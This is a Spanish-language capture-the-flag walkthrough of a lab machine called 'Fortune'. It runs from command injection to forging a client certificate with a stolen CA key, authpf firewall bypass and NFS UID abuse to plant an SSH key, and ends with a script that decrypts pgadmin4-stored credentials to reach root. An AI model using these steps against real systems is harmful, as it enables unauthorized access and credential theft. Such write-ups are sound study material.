>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.34.122
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 15:26 EST
Nmap scan report for 10.129.34.122
Host is up (0.063s latency).
Not shown: 65338 closed tcp ports (reset), 194 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 9.1 (protocol 2.0)
80/tcp  open  http       OpenBSD httpd
443/tcp open  ssl/https?
```

>Realizamos un escaneo con Whatweb en las dos webs para ver sus tecnologías empleadas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ whatweb http://10.129.34.122             
http://10.129.34.122 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[OpenBSD httpd], IP[10.129.34.122], Title[Fortune], X-UA-Compatible[IE=edge]
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ whatweb https://10.129.34.122
ERROR Opening: https://10.129.34.122 - SSL_read: tlsv13 alert certificate required (SSL alert number 116)
```

>Esta es la página web principal en el puerto TCP 80:

<img width="594" height="230" alt="image" src="https://github.com/user-attachments/assets/bb47306e-80dc-4955-9e46-fa8203f3e748" />

>Vemos que es vulnerable a Command Injection al concatenar un comando empleando ";":

<img width="1318" height="573" alt="image" src="https://github.com/user-attachments/assets/9e62becf-b041-47fe-bd2a-bef9db472693" />

>Leemos los dos certificados que vemos en el directorio y los copiamos en local:

<img width="1255" height="603" alt="image" src="https://github.com/user-attachments/assets/d941fff9-8cb0-4672-8012-a33e0823ede8" />

<img width="1244" height="610" alt="image" src="https://github.com/user-attachments/assets/16ea1fbf-1cb0-4e74-88ce-1b367d4dc63c" />

>Con esto, vamos a crear un certificado de cliente para poder acceder a la web que hay en el puerto 443, ya que sin este, no podríamos acceder:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ openssl genrsa -out client.key 2048                                              
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ openssl req -new -key client.key -out client.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:. 
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ openssl x509 -req -in client.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out client.pem -days 1024 -sha256
Certificate request self-signature ok
subject=ST=Some-State, O=Internet Widgits Pty Ltd
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ openssl pkcs12 -export -out client.pfx -inkey client.key -in client.pem -certfile intermediate.cert.pem                                  
Enter Export Password:
Verifying - Enter Export Password:
```

>Lo agregamos a firefox en el apartado security > View my Certificates > Your Certificates :

<img width="604" height="418" alt="image" src="https://github.com/user-attachments/assets/8bcb443e-1ec6-409e-b969-29d04caf8246" />

>Accedemos a la página web por HTTPS y vemos lo siguiente:

<img width="1457" height="98" alt="image" src="https://github.com/user-attachments/assets/9a717176-0dc2-42c0-9616-f7cc56e19699" />

>Obtenemos la clave authpf de un usuario:

<img width="1475" height="600" alt="image" src="https://github.com/user-attachments/assets/1b5f63ba-cee2-4866-81b4-a2b32986b094" />

>Si vemos el /etc/passwd podemos ver que podemos acceder con la clave como el user nfsuser probablemente ya que tiene como shell `/usr/sbin/authpf`:

<img width="1267" height="581" alt="image" src="https://github.com/user-attachments/assets/6b9a4f14-8d15-40a4-8ad1-90dcbd5b1a48" />

>Accedemos con la clave, esto nos permitirá evadir el firewall ya que esta conexión entablada deshabilita el packet filter:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ ssh nfsuser@10.129.34.122 -i authpf 
The authenticity of host '10.129.34.122 (10.129.34.122)' can't be established.
ED25519 key fingerprint is: SHA256:xYk/iFa05KYp2CIxGQzmGA87mfmmHcNA3srRDtVXEEw
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.34.122' (ED25519) to the list of known hosts.

Hello nfsuser. You are authenticated from host "10.10.14.71"
```

>Volvemos a realizar un escaneo por nmap ahora que el firewall no nos molesta:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.34.122
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 16:36 EST
Nmap scan report for 10.129.34.122
Host is up (0.063s latency).
Not shown: 62928 filtered tcp ports (no-response), 2600 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 9.1 (protocol 2.0)
80/tcp   open  http             OpenBSD httpd
111/tcp  open  rpcbind          2 (RPC #100000)
443/tcp  open  ssl/https?
889/tcp  open  mountd           1-3 (RPC #100005)
2049/tcp open  nfs              2-3 (RPC #100003)
8081/tcp open  blackice-icecap?
```

>Vemos que hay una share por NFS llamada home disponible para todo el mundo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ showmount -e 10.129.34.122
Export list for 10.129.34.122:
/home (everyone)
```

>Lo montamos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ mkdir nfs                       
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo mount -t nfs -o vers=3 10.129.34.122:/home nfs         
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
```

>Contenido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune/nfs]
└─$ tree                                               
.
├── bob
│   ├── ca
│   │   ├── certs
│   │   │   └── ca.cert.pem
│   │   ├── crl
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── index.txt.old
│   │   ├── intermediate
│   │   │   ├── certs
│   │   │   │   ├── ca-chain.cert.pem
│   │   │   │   ├── fortune.htb.cert.pem
│   │   │   │   └── intermediate.cert.pem
│   │   │   ├── crl
│   │   │   ├── crlnumber
│   │   │   ├── csr
│   │   │   │   ├── fortune.htb.csr.pem
│   │   │   │   └── intermediate.csr.pem
│   │   │   ├── index.txt
│   │   │   ├── index.txt.attr
│   │   │   ├── newcerts
│   │   │   │   └── 1000.pem
│   │   │   ├── openssl.cnf
│   │   │   ├── private
│   │   │   │   ├── fortune.htb.key.pem
│   │   │   │   └── intermediate.key.pem
│   │   │   ├── serial
│   │   │   └── serial.old
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── private  [error opening dir]
│   │   ├── serial
│   │   └── serial.old
│   └── dba
│       └── authpf.sql
├── charlie
│   ├── mbox
│   └── user.txt
└── nfsuser
```

>Primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune/nfs]
└─$ cat charlie/user.txt 
ada0affd040090a6daede65f10737c40
```

>Vamos a agregar al authorized keys de charlie nuestra clave pública ya que nuestro usuario kali tiene el UID 1000 que coincide con el de charlie y debido a que usamos la versión 3 de NFS al montar la share podemos emplear estre truco para acceder y modificar archivos sin estar autorizados realmente:

```bash
┌──(root㉿jbkira)-[/home/kali/Desktop/machines/fortune]
└─# ssh-keygen -f charlie.ssh         
Generating public/private ed25519 key pair.
Enter passphrase for "charlie.ssh" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in charlie.ssh
Your public key has been saved in charlie.ssh.pub
The key fingerprint is:
SHA256:NvxGp2W1JlDOK/eG15pukpjdb7A1ZTtrLuP52RWLy0M root@jbkira
The key's randomart image is:
+--[ED25519 256]--+
|            .    |
|           +     |
|          . o .  |
|       .   . o .o|
|        S o B ooo|
|       . + B Eo=+|
|          ++o++=*|
|         .o =**==|
|            .O@*o|
+----[SHA256]-----+

┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo cat charlie.ssh.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPOAD1hHv9EJy4zhuq1sDxZrpIEsmRcccaDQU2i4kn4B root@jbkira
    
┌──(kali㉿jbkira)-[~/…/fortune/nfs/charlie/.ssh]
└─$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPOAD1hHv9EJy4zhuq1sDxZrpIEsmRcccaDQU2i4kn4B root@jbkira' > authorized_keys

┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo chmod 600 charlie.ssh     
                                                                                               
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sudo su                   
     
┌──(root㉿jbkira)-[/home/kali/Desktop/machines/fortune]
└─# ssh charlie@10.129.34.122 -i charlie.ssh 
OpenBSD 7.2 (GENERIC) #5: Tue Jul 25 16:20:27 CEST 2023

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$
```

>Obtenemos el archivo de bases de datos de pgadmin4:

```bash
bash-5.1$ pwd
/var/appsrv/pgadmin4
bash-5.1$ python3 -m http.server 10000
Serving HTTP on 0.0.0.0 port 10000 (http://0.0.0.0:10000/) ...
```

>Vemos credenciales en la tabla user:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ sqlite3 pgadmin4.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
alembic_version              roles_users                
debugger_function_arguments  server                     
keys                         servergroup                
module_preference            setting                    
preference_category          user                       
preferences                  user_preferences           
process                      version                    
role                       
sqlite> select * from user;
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|
```

>Usamos el siguiente script para desencriptarla:

```python
from Crypto.Cipher import AES
import base64

padding_string = b'}'  # bytes explícito para Python 3

def pad(key: bytes) -> bytes:
    """Añade padding a la clave hasta 32 bytes (AES-256)."""
    if isinstance(key, str):
        key = key.encode()  # si acaso llega str, lo pasamos a bytes
    str_len = len(key)
    if str_len > 32:
        return key[:32]
    if str_len in (16, 24, 32):
        return key
    pad_len = 32 - str_len
    return key + padding_string * pad_len  # repetimos el byte '}'


def decrypt(ciphertext_b64: str, key: bytes) -> str:
    """Descifra AES-CFB con IV al principio del ciphertext."""
    ciphertext = base64.b64decode(ciphertext_b64)
    iv = ciphertext[:AES.block_size]
    ct = ciphertext[AES.block_size:]
    cipher = AES.new(pad(key), AES.MODE_CFB, iv)
    pt = cipher.decrypt(ct)
    return pt.decode(errors='ignore')


# Uso
ct = "utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz"
k = b"$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg"

print(decrypt(ct, k))
```

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/fortune]
└─$ python3 decrypt.py
R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
```

>Usamos las credenciales para loguearnos como root en la sesión de ssh y leemos la flag final:

```bash
bash-5.1$ su root
Password:
fortune# whoami
root
fortune# cat /root/root.txt
335af7f02878890aea32d64f7ea3a0f8
```
